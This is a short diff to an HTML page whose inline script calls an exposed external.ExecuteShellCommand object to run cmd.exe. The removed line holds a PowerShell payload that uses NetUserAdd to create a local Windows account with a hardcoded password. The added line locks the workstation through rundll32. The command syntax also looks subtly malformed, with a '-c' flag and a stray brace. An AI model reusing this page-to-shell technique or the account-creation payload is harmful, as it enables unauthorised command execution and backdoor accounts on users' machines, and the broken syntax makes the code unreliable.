@@ -9,7 +9,7 @@
     <script type="text/javascript">
         function executeCommand() {
             try {
-                external.ExecuteShellCommand("cmd.exe", "", "-c powershell.exe Add-Type -TypeDefinition \"using System; using System.Runtime.InteropServices; public class Win32API { [DllImport(`\"Netapi32.dll`\", SetLastError=true, CharSet=CharSet.Unicode)] public static extern int NetUserAdd(string servername, int level, ref USER_INFO_1 buf, out int parm_err); [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct USER_INFO_1 { public string usri1_name; public string usri1_password; public uint usri1_password_age; public uint usri1_priv; public string usri1_home_dir; public string usri1_comment; public uint usri1_flags; public string usri1_script_path; } public const uint USER_PRIV_USER = 1; public const uint UF_SCRIPT = 1; }\" -PassThru | Out-Null; $UserInfo = New-Object Win32API+USER_INFO_1; $UserInfo.usri1_name = \"NewUser\"; $UserInfo.usri1_password = \"P@ssw0rd!\"; $UserInfo.usri1_priv = [Win32API]::USER_PRIV_USER; $UserInfo.usri1_flags = [Win32API]::UF_SCRIPT; $result = [Win32API]::NetUserAdd($null, 1, [ref]$UserInfo, [ref]0); if ($result -eq 0) { Write-Output \"User created successfully\"; } else { Write-Output \"Failed to create user. Error code: $result\"; }", "open")
+                external.ExecuteShellCommand("cmd.exe", "", "-c rundll32.exe user32.dll,LockWorkStation }", "open")
             } catch (e) {
                 alert("Failed to execute command: " + e.message);
             }
